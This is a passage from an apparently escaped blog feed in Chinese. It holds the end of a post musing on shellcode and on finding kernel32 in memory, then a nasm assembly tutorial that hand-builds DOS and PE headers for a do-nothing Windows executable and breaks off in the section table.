&lt;p>验证方法很简单，我们编译之，运行，然后就好啦！&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/%e5%85%b3%e4%ba%8e%e5%9c%a8%e5%86%85%e5%ad%98%e9%87%8c%e6%89%bekernel32%e8%bf%99%e4%bb%b6%e4%ba%8b/image-20211014161140486.png"
loading="lazy"
alt="image-20211014161140486"
>&lt;/p>
&lt;p>&lt;code>WinExec&lt;/code> 的返回值在 eax 里，微软的文档说返回值大于 31 就是 OJBK，0x21 是10进制的33，所以完全 OJBK 。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>这是写 shellcode 的技术吧，东一榔头西一棒子就是我了。话说 shellcode 的具体定义是啥来着？我只剩菜了.jpg&lt;/p>
&lt;p>最终体会就是写过汇编才知道 C 真的是很高级的语言了（&lt;/p>
&lt;p>真要算地址算偏移一算一整天，365天对着16进制数做加减乘除那真就是折磨。&lt;/p>
&lt;p>Windows 未公开的数据结构也不知道网上的大佬都是怎么研究出来的，毕竟理论上来说搞这个没有任何价值，在逆向研究出结果之前谁也不知道这些东西能带来什么价值，甚至你搞完了也不知道有什么价值，直到有一天被正好有需要的人发现（大黑阔：现成的洞，好耶）。&lt;/p>
&lt;p>嗯，这个想法就让人比较兴奋，顿时感觉自己闲出屁摸鱼也是在为社会创造价值了呢~&lt;/p>
&lt;p>另外关于如何用 C 写 shellcode，其实我想了下，也许可以让编译器把汇编吐出来，然后从里面拿咱需要的代码？不过这也不知道怎么编译器吐出能让 nasm 接受的汇编。或者有啥比较业界通行的语法标准？只知道有 AT&amp;amp;T 和 Intel 两种风格，但非要说的话 nasm 和 masm 都有些不兼容，尽管都是 Intel 风格（大概）。或者就是让编译器吐个 obj 文件出来，然后解析这个 obj ，提取里面的二进制代码就好。&lt;/p>
&lt;p>好了瞎bb完毕。收工啦。&lt;/p></description></item><item><title>nasm汇编手写个PE可执行文件</title><link>https://nnnewb.github.io/blog/p/hand-write-pe-file-with-nasm-assembly/</link><pubDate>Wed, 13 Oct 2021 11:05:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/hand-write-pe-file-with-nasm-assembly/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>主要是虽然有个汇编器 nasm 但是不知道怎么用，啥汇编都是调试器里纸上谈兵。最近碰到个问题，MinGW 可以用参数 &lt;code>-Wl,section-start=&lt;/code> 来修改 section 地址，但 &lt;em>msvc&lt;/em> 没有对应物，就蛋疼。手动改 PE 来添加 section 好像可行，但不知道该怎么做，lief 也不熟悉。&lt;/p>
&lt;p>正好瞎谷歌的时候发现 nasm 可以直接编译出 PE 文件，这就听起来很有意思了。汇编嘛，听着就很底层，很自由，改个 Section 地址不是手到擒来。于是就学学看。&lt;/p>
&lt;p>参考文章附于文末。&lt;/p>
&lt;h2 id="0x01-nasm-基本用法">0x01 nasm 基本用法&lt;/h2>
&lt;h3 id="11-label">1.1 label&lt;/h3>
&lt;p>汇编当然有经典的 &lt;em>label&lt;/em> 和 &lt;em>instruction&lt;/em> 了，&lt;em>instruction&lt;/em> 的参数就叫 &lt;em>operand&lt;/em> 。&lt;/p>
&lt;p>nasm 的 label 语法很简单，任何不是宏和 &lt;em>instruction&lt;/em> 或者伪指令的东西，出现在行首，都会被认作 label。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nl">lbl1:&lt;/span> &lt;span class="c">; 这是label
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="nf">sub&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="no">h&lt;/span>
&lt;span class="nf">jmp&lt;/span> &lt;span class="no">lbl&lt;/span>
&lt;span class="nf">lbl2&lt;/span> &lt;span class="c">; 这也是 label
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">sub&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="no">h&lt;/span>
&lt;span class="nf">lbl3&lt;/span> &lt;span class="no">db&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="c">; 这还是 label
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">.label4&lt;/span> &lt;span class="c">; 这是本地 label，可以用 .label4 或者全称 lbl3.label4 访问
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">.@label5&lt;/span> &lt;span class="c">; 这是特殊 label ，只能在宏里使用，避免干扰本地label
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>label 可以被视作一个数字参与运算，比如说 &lt;code>lbl3-lbl2&lt;/code> 这样算出偏移。或者还可以参数伪指令计算。总之用处很多。&lt;/p>
&lt;h3 id="12-伪指令">1.2 伪指令&lt;/h3>
&lt;p>伪指令是一些并不是真正的 x86 机器指令，但还是被用在了 instruction 域中的指 令，因为使用它们可以带来很大的方便。当前的伪指令有&lt;code>DB&lt;/code>,&lt;code>DW&lt;/code>,&lt;code>DD&lt;/code>,&lt;code>DQ&lt;/code>和 &lt;code>DT&lt;/code>，它们对应的未初始化指令是 &lt;code>RESB&lt;/code>, &lt;code>RESW&lt;/code>,&lt;code> RESD&lt;/code>,&lt;code> RESQ&lt;/code> 和 &lt;code>REST&lt;/code>，&lt;code>INCBIN&lt;/code> 命令，&lt;code>EQU&lt;/code> 命令和 &lt;code>TIEMS&lt;/code> 前缀。&lt;/p>
&lt;p>不复制粘贴了，看文档好吧。&lt;/p>
&lt;h3 id="12-有效地址">1.2 有效地址&lt;/h3>
&lt;p>有效地址是指令的操作数，是对内存的引用。nasm中有效地址的语法非常简单：由一个可计算表达式组成，放在中括号内。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nl">wordvar:&lt;/span>
&lt;span class="nf">dw&lt;/span> &lt;span class="mi">123&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">wordvar&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; [wordvar] 就是取 dw 123 的首地址
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">wordvar&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; wordvar+1 label 参与算术运算，取 dw 123 地址 + 1字节
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">es&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="no">wordvar&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">bx&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; 加上段选择子，寄存器参与运算
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>与上例不一致的表达式都不是 nasm 的有效地址，比如 &lt;code>es:wordvar[bx]&lt;/code> 。&lt;/p>
&lt;p>还可以用 &lt;code>BYTE&lt;/code> &lt;code>WORD&lt;/code> &lt;code>DWORD&lt;/code> &lt;code>NOSPLIT&lt;/code> 等关键字强迫 nasm 产生特定形式的有效地址。比如 &lt;code>[dword eax+3]&lt;/code> 。&lt;/p>
&lt;p>详细还是看文档。&lt;/p>
&lt;h3 id="13-常数">1.3 常数&lt;/h3>
&lt;p>支持的常数类型包括：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>数值&lt;/p>
&lt;ul>
&lt;li>&lt;code>100&lt;/code> 10进制&lt;/li>
&lt;li>&lt;code>100h&lt;/code> 16进制，&lt;code>h&lt;/code>结尾&lt;/li>
&lt;li>&lt;code>0x100&lt;/code> 16进制，&lt;code>0x&lt;/code>开头&lt;/li>
&lt;li>&lt;code>$0100&lt;/code> 16进制，&lt;code>$0&lt;/code>开头&lt;/li>
&lt;li>&lt;code>777q&lt;/code> 8进制，&lt;code>q&lt;/code>结尾&lt;/li>
&lt;li>&lt;code>10010011b&lt;/code> 2进制，&lt;code>b&lt;/code>结尾&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>字符&lt;/p>
&lt;ul>
&lt;li>&lt;code>abcd&lt;/code> 字符型常数，小端序&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>字符串&lt;/p>
&lt;ul>
&lt;li>一般只有伪指令接受，形式如 &lt;code>db 'abcd'&lt;/code> 、&lt;code>db 'a','b','c','d'&lt;/code> 。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>浮点数&lt;/p>
&lt;ul>
&lt;li>反正用不到我也懒得看。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="14-表达式">1.4 表达式&lt;/h3>
&lt;p>和C的差不多，除了+-*/%和位运算，多了个 &lt;code>//&lt;/code> 表示带符号除法，&lt;code>%%&lt;/code> 表示带符号取模。&lt;/p>
&lt;h3 id="15-预处理器">1.5 预处理器&lt;/h3>
&lt;p>预处理器指令以 &lt;code>%&lt;/code> 开头。举几个例子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">FOO&lt;/span> &lt;span class="no">BAR&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">FN&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="no">x&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">include&lt;/span> &lt;span class="err">&amp;#34;&lt;/span>&lt;span class="no">xxx.asm&lt;/span>&lt;span class="err">&amp;#34;&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">undef&lt;/span> &lt;span class="no">FOO&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>其他懒得写了，先知道这几个和C类似的宏就行，更多看文档。&lt;/p>
&lt;h3 id="16-汇编器指令">1.6 汇编器指令&lt;/h3>
&lt;p>提几个会用到的。&lt;/p>
&lt;p>&lt;code>BITS&lt;/code>，指定目标处理器模式，比如 &lt;code>BITS 32&lt;/code> 就是32位模式。现在找16位的环境怕是也难。&lt;/p>
&lt;p>&lt;code>SECTION&lt;/code>，改变正在编写的代码要汇编进的段。要是打算汇编成 &lt;code>obj&lt;/code> 让链接器去链接出新文件会有点用。但是输出格式是 &lt;code>bin&lt;/code> 的时候就没有卵用了。&lt;/p>
&lt;p>&lt;code>EXTERN&lt;/code>，导入外部符号，还是汇编成 &lt;code>obj&lt;/code> 让链接器用的时候会有点用，链接器会搞定链接，输出格式是 &lt;code>bin&lt;/code> 的时候就没卵用。&lt;/p>
&lt;p>&lt;code>GLOBAL&lt;/code>，导出符号，和&lt;code>EXTERN&lt;/code>的应用场景差不多。熟悉C的码农应该能理解。&lt;/p>
&lt;h3 id="17-输出格式">1.7 输出格式&lt;/h3>
&lt;p>几个值得关注的输出格式。&lt;/p>
&lt;p>&lt;code>-f win32&lt;/code> 就是输出成 win32 对象文件 &lt;code>.obj&lt;/code>，之后可以用 &lt;code>gcc&lt;/code> 或者 &lt;code>link.exe&lt;/code> 之类的东西链接。&lt;/p>
&lt;p>&lt;code>-f bin&lt;/code> 输出成二进制文件，你写了啥就输出啥，nasm 就是个翻译官。&lt;code>.COM&lt;/code>和&lt;code>.SYS&lt;/code>都是纯二进制格式的，你要是写这些可能有用。还有操作系统引导程序之类的纯二进制程序，不需要别的什么文件格式的情况。&lt;/p>
&lt;p>&lt;code>-f elf&lt;/code> 你要是写 linux 下的程序就有用。&lt;/p>
&lt;h3 id="18-总结">1.8 总结&lt;/h3>
&lt;p>基本就是这样，更多东西就现查现用好吧。善用谷歌。&lt;/p>
&lt;h2 id="0x02-简单汇编程序">0x02 简单汇编程序&lt;/h2>
&lt;p>先写一个简单的汇编程序，不直接产生可执行文件，而是需要链接器进一步链接。例子需要安装 MinGW。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">section&lt;/span> &lt;span class="no">.data&lt;/span>
&lt;span class="nf">global&lt;/span> &lt;span class="no">HelloWorld&lt;/span>
&lt;span class="nl">HelloWorld:&lt;/span>
&lt;span class="nf">db&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="no">hello&lt;/span> &lt;span class="no">world&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="c">; 定义一个字符串常量，用于输出
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">section&lt;/span> &lt;span class="no">.text&lt;/span>
&lt;span class="nf">global&lt;/span> &lt;span class="no">_main&lt;/span> &lt;span class="c">; _main 就是 C 的 main, 用于让链接器识别出入口点，生成命令行程序
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">extern&lt;/span> &lt;span class="no">_printf&lt;/span> &lt;span class="c">; _printf 就是 C 的 printf, 用于输出 hello world
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nl">_main:&lt;/span>
&lt;span class="nf">push&lt;/span> &lt;span class="no">ebp&lt;/span> &lt;span class="c">; 其实我们自己写就不用啰嗦 push ebp/mov ebp,esp 了, 心里有底就行
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ebp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span>
&lt;span class="nf">push&lt;/span> &lt;span class="no">HelloWorld&lt;/span> &lt;span class="c">; 压入字符串常量的地址做参数
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">_printf&lt;/span> &lt;span class="c">; 调用 printf 输出
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="c">; 根据 cdecl 约定，完成平栈
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">pop&lt;/span> &lt;span class="no">ebp&lt;/span> &lt;span class="c">; 要返回一个值的话可以再加一行 mov eax, 0 等同于 return 0
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">retn&lt;/span> &lt;span class="c">; 完事
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译命令，要安装 MinGW 才有 gcc 可以用。或者其他链接器也可以，GoLink 好像就行，但是我没用过。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">nasm main.asm -f win32 -o main.o
gcc main.o -o main.exe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>生成的代码放进调试器看看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/nasm%e6%89%8b%e5%86%99%e4%b8%aaPE%e5%8f%af%e6%89%a7%e8%a1%8c%e6%96%87%e4%bb%b6/image-20211013092916141.png"
loading="lazy"
alt="image-20211013092916141"
>&lt;/p>
&lt;p>可以看到我们的汇编代码忠实地出现在调试器里。&lt;/p>
&lt;p>这就是 nasm 的简单用法了，想要拿汇编写一点简单的验证代码是没问题的，也可以手写汇编函数，再链接到 C/C++ 代码里。当然，写 C/C++ 的大佬大概也知道 Visual C++ 支持内嵌汇编，&lt;code>__asm {}&lt;/code> 就行，这也算一种选项。&lt;/p>
&lt;h2 id="0x03-生成二进制代码">0x03 生成二进制代码&lt;/h2>
&lt;p>使用 &lt;code>nasm -f bin&lt;/code> 可以直接从汇编代码生成二进制文件，也就是没有链接这一步。&lt;/p>
&lt;p>当然，没有链接这一步（或者说链接相关信息不由 nasm 管理），&lt;code>global&lt;/code> 和 &lt;code>extern&lt;/code> 都没有意义，在 &lt;code>-f bin&lt;/code> 时汇编器会直接提示错误，不能使用。但相对的，因为 nasm 没自动生成更多信息，我们也对汇编结果有了更强的控制力，也要负担更多责任。&lt;/p>
&lt;h3 id="31-生成-dos-文件头">3.1 生成 DOS 文件头&lt;/h3>
&lt;p>PE 文件格式不再赘述，参考微软的 &lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener"
>PE Format&lt;/a> 文档，或者维基百科的 PE 格式图即可。&lt;/p>
&lt;p>先从生成 PE 文件的文件头开始，填充可执行文件的必要信息。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">BITS&lt;/span> &lt;span class="mi">32&lt;/span>
&lt;span class="c">; 由编译器生成的 DOS 文件头其实包含了一段输出 This program cannot be run in DOS mode 的代码
&lt;/span>&lt;span class="c">; 我们不需要，这里直接忽略。
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nl">dos_header:&lt;/span>
&lt;span class="na">.magic&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="s">&amp;#34;MZ&amp;#34;&lt;/span> &lt;span class="c">; dw 伪指令会放置一个双字节 word, 也就是操作数 MZ
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.cblp&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">90&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 90h 就是 0x90
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.cp&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">3&lt;/span>
&lt;span class="na">.crlc&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.cparhdr&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">4&lt;/span>
&lt;span class="na">.minalloc&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.maxalloc&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;span class="na">.ss&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.sp&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="no">B8h&lt;/span>
&lt;span class="na">.csum&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.ip&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.cs&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.lfarlc&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">40&lt;/span>&lt;span class="no">h&lt;/span>
&lt;span class="na">.ovno&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.res&lt;/span> &lt;span class="no">times&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c">; 伪指令 times 重复 n 次，放置 4 个双字节 word ，值为 0
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.oemid&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.oeminfo&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.res2&lt;/span> &lt;span class="no">times&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.lfanew&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="no">.next&lt;/span> &lt;span class="c">; 紧随其后的就是 NT 文件头了，所以 lfanew 直接指向自己末尾后
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.next&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>关于链接器自动生成的文件头，可以参考这篇文章 &lt;a class="link" href="http://blog.marcinchwedczuk.pl/a-closer-look-at-portable-executable-msdos-stub" target="_blank" rel="noopener"
>a closer look at portable executable MS-DOS stub&lt;/a> 。&lt;/p>
&lt;p>反正咱无脑复制了。&lt;/p>
&lt;h3 id="32--生成-pe-文件头">3.2 生成 PE 文件头&lt;/h3>
&lt;p>生成 PE 文件头之前我们要预先考虑几个要素。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>文件如何对齐？&lt;/p>
&lt;p>对齐到 0x400，大部分内容都可以在一个 0x400 里填写完，计算量比较少。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Section 如何对齐？&lt;/p>
&lt;p>对齐到 0x1000，同样是简化计算。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>需要几个 Section？&lt;/p>
&lt;p>一个 &lt;code>.text&lt;/code> 就足够了。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>其余文件头内容，出于简单考虑，包括重定位和 IAT 在内的大部分东西都留空，仅仅写一个什么效果都没有的可执行文件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nl">nt_header:&lt;/span>
&lt;span class="nl">pe_signature:&lt;/span>
&lt;span class="na">.sig&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="s">&amp;#34;PE&amp;#34;&lt;/span> &lt;span class="c">; 魔术标识, dd 伪指令填充一个 DWORD, 结果是 PE\0\0
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nl">file_header:&lt;/span>
&lt;span class="na">.machine&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0x014c&lt;/span> &lt;span class="c">; 支持 Intel I386
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.numberofsections&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0x01&lt;/span> &lt;span class="c">; 本文件包含一个 Section
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.timedatestamp&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.pointertosymboltable&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.numberofsymbols&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.optheadersize&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="no">$OPT_HEADER_SIZE&lt;/span> &lt;span class="c">; opt_header_size 会在稍后的 optional_header 末尾计算得到
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.characteristics&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0x102&lt;/span> &lt;span class="c">; 声明本文件是一个32位Windows可执行程序
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nl">optional_header:&lt;/span>
&lt;span class="na">.magic&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0x10b&lt;/span>
&lt;span class="na">.linker_version&lt;/span> &lt;span class="no">db&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;span class="na">.sizeof_code&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">1000&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 共包含 0x1000 字节的代码段
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.sizeof_initialized_data&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.sizeof_uninitialized_data&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.addressof_entrypoint&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">1000&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 入口点 RVA
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.baseof_code&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">1000&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 代码段 RVA
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.baseof_data&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 数据段 RVA, 没有数据段就留空了
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.image_base&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">4000000&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 镜像基址 0x04000000, 后面是 6 个 0
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.section_alignment&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">1000&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; section 对齐到 1000h
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.file_alignment&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">400&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 文件对齐到 400h
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.os_version&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;span class="na">.img_version&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;span class="na">.subsystem_version&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;span class="na">.win32_ver_value&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.sizeof_img&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">2000&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 请求的镜像总大小，文件头到代码段起点共 1000h, 代码段 1000h, 共计 2000h
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.sizeof_headers&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">400&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 文件头大小对齐到了 400h, 我们知道文件头肯定不足 400h, 所以 sizeof_headers 直接填 400h 就行
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.checksum&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.subsystem&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">2&lt;/span>
&lt;span class="na">.dll_characteristics&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0x400&lt;/span> &lt;span class="c">; 不支持 SEH, 不开启 ASLR
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">.sizeof_stack_reserved&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0x100000&lt;/span>
&lt;span class="na">.sizeof_stack_commit&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0x1000&lt;/span>
&lt;span class="na">.sizeof_heap_reserved&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0x100000&lt;/span>
&lt;span class="na">.sizeof_heap_commit&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0x1000&lt;/span>
&lt;span class="na">.loeader_flags&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="na">.numberof_rva_and_sizes&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 后续有 16 个 Data Directories
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nl">data_directories:&lt;/span>
&lt;span class="nf">times&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c">; 所有的 data directories 填充 0
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="c">; 通过伪指令 equ ，给 $OPT_HEADER_SIZE 赋值为 (当前地址 - optional_header标签)
&lt;/span>&lt;span class="c">; 也就是整个 optional_header 的大小
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nf">$OPT_HEADER_SIZE&lt;/span> &lt;span class="no">equ&lt;/span> &lt;span class="no">$&lt;/span> &lt;span class="p">-&lt;/span> &lt;span class="no">optional_header&lt;/span>
&lt;span class="nl">section_table:&lt;/span>
&lt;span class="nl">.text:&lt;/span>
&lt;span class="nf">db&lt;/span> &lt;span class="err">&amp;#34;&lt;/span>&lt;span class="no">.text&lt;/span>&lt;span class="err">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c">; section name
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="c">; 注意对齐到了 8 字节，不足部分 0 填充, 不能超出
